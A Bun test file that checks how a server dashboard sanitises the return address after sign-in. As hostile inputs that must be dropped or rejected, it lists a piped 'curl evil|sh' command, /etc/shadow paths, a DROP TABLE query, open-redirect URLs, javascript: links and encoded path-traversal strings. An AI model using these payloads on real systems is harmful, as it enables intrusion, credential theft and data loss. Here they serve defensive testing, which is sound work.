import { describe, expect, test } from "bun:test"
import { readdirSync } from "node:fs"
import { join } from "node:path"
import { KEPT_QUERY, SIGNED_IN_SECTIONS, returnAfterSignIn, signInAddress } from "./sign-in-return"

describe("the page a signed-out browser asked for survives signing in", () => {
  test("a plain page behind the sign-in is carried to the sign-in page and back", () => {
    expect(signInAddress("/docker/containers")).toBe("/login?next=%2Fdocker%2Fcontainers")
    expect(returnAfterSignIn("/docker/containers")).toBe("/docker/containers")
    // What the alert e-mails link to.
    for (const path of [
      "/backups",
      "/backups/nightly-db",
      "/deploy/12/runs/4f2a",
      "/deploy/notifications",
      "/network/drift",
      "/proxy/certificates",
      "/metrics/alerts",
      "/databases/7/query",
      "/docker/containers/web-1",
      "/excalidraw/9b1c2d",
      "/account/keys",
    ]) {
      expect(returnAfterSignIn(path)).toBe(path)
    }
    expect(returnAfterSignIn("/docker/containers/")).toBe("/docker/containers")
    expect(returnAfterSignIn("/docker/containers/my%20app")).toBe("/docker/containers/my%20app")
  })

  test("the Overview needs no return address", () => {
    expect(signInAddress("/")).toBe("/login")
    expect(returnAfterSignIn("/")).toBeUndefined()
    expect(returnAfterSignIn("/?tab=x")).toBeUndefined()
  })

  test("a key that only chooses a view is kept, on the pages where that is all it does", () => {
    expect(returnAfterSignIn("/docker/containers/web-1?tab=logs")).toBe(
      "/docker/containers/web-1?tab=logs",
    )
    expect(returnAfterSignIn("/logs?source=docker%3Aweb-1&tab=x")).toBe(
      "/logs?tab=x&source=docker%3Aweb-1",
    )
    expect(returnAfterSignIn("/map?system=deploy%3A12")).toBe("/map?system=deploy%3A12")
    // The same key on Backups opens a job form with a path in it: not carried.
    expect(returnAfterSignIn("/backups?source=%2Fetc")).toBe("/backups")
    expect(returnAfterSignIn("/docker?system=x")).toBe("/docker")
  })

  test("a key that fills a field, opens a dialog or seeds a command is dropped; the page stays", () => {
    expect(returnAfterSignIn("/databases/7/query?sql=DROP%20TABLE%20users")).toBe(
      "/databases/7/query",
    )
    expect(returnAfterSignIn("/terminal?command=curl%20evil%7Csh&tab=2")).toBe("/terminal?tab=2")
    expect(returnAfterSignIn("/network/firewall?add=1&port=22&source=anywhere")).toBe(
      "/network/firewall",
    )
    expect(returnAfterSignIn("/files?path=%2Fetc%2Fshadow")).toBe("/files")
    expect(returnAfterSignIn("/deploy/new?url=https%3A%2F%2Fevil.example%2Frepo")).toBe(
      "/deploy/new",
    )
    expect(returnAfterSignIn("/docker/containers?tab=logs#frag")).toBe(
      "/docker/containers?tab=logs",
    )
    expect(returnAfterSignIn(`/docker?tab=${"a".repeat(301)}`)).toBe("/docker")
    // No key is kept that the list does not name.
    expect(Object.keys(KEPT_QUERY).sort()).toEqual(["connect", "source", "system", "tab"])
  })

  test("an address that is not a plain page of this dashboard goes nowhere", () => {
    for (const next of [
      null,
      undefined,
      "",
      "docker",
      "https://evil.example/docker",
      "//evil.example/docker",
      "/\\evil.example/docker",
      "/docker\\..\\..\\evil",
      "/%5Cevil.example/docker",
      "javascript:alert(1)",
      // Not pages: the API, a download, the framework's files, the sign-in itself.
      "/api/v1/files/raw?path=/etc/shadow",
      "/api/v1/auth/logout",
      "/_next/static/chunks/x.js",
      "/login?next=/docker",
      "/welcome",
      "/hub/enter",
      "/monaco/vs/loader.js",
      // A path that only resolves to a section, or leaves one, is not that section's page.
      "/docker/../api/v1/tokens",
      "/dashboard/hub/../../evil?connect=hub",
      "/docker/%2e%2e/%2e%2e/api/v1/tokens",
      "/docker//containers",
      "/docker/a%2Fb",
      "/docker/a%00b",
      "/docker/%E0%A4%A",
      "/dockerx",
      `/docker/${"a".repeat(600)}`,
    ]) {
      expect(returnAfterSignIn(next)).toBeUndefined()
    }
    expect(signInAddress("/api/v1/files/raw?path=/etc/shadow")).toBe("/login")
  })
})

// The hub opens its Connect door in a new tab, usually signed out (protocol §8.1).
describe("the hub's Connect door survives signing in", () => {
  test("the door is carried to the sign-in page and back, re-encoded", () => {
    expect(signInAddress("/dashboard/hub?connect=hub.tailed39ba.ts.net")).toBe(
      "/login?next=%2Fdashboard%2Fhub%3Fconnect%3Dhub.tailed39ba.ts.net",
    )
    expect(returnAfterSignIn("/dashboard/hub?connect=127.0.0.1%3A9641")).toBe(
      "/dashboard/hub?connect=127.0.0.1%3A9641",
    )
    // Only `connect` is kept there; the page still treats it as a suggestion (`connectTarget`).
    expect(returnAfterSignIn("/dashboard/hub?connect=hub.tailed39ba.ts.net&x=1#y")).toBe(
      "/dashboard/hub?connect=hub.tailed39ba.ts.net",
    )
    expect(returnAfterSignIn("/dashboard/hub?connect=javascript:alert(1)")).toBe(
      "/dashboard/hub?connect=javascript%3Aalert(1)",
    )
  })

  test("without a usable host it is Settings → Hub, and `connect` means nothing elsewhere", () => {
    expect(returnAfterSignIn("/dashboard/hub")).toBe("/dashboard/hub")
    expect(returnAfterSignIn("/dashboard/hub?connect=")).toBe("/dashboard/hub")
    expect(returnAfterSignIn(`/dashboard/hub?connect=${"a".repeat(301)}`)).toBe("/dashboard/hub")
    expect(returnAfterSignIn("/dashboard/update?connect=hub.tailed39ba.ts.net")).toBe(
      "/dashboard/update",
    )
  })
})

test("every section behind the sign-in is listed, and nothing else is", () => {
  const folders = readdirSync(join(import.meta.dir, "..", "app", "(dashboard)"), {
    withFileTypes: true,
  })
    .filter((entry) => entry.isDirectory() && !entry.name.startsWith("["))
    .map((entry) => entry.name)
    .sort()
  expect([...SIGNED_IN_SECTIONS].sort()).toEqual(folders)
})
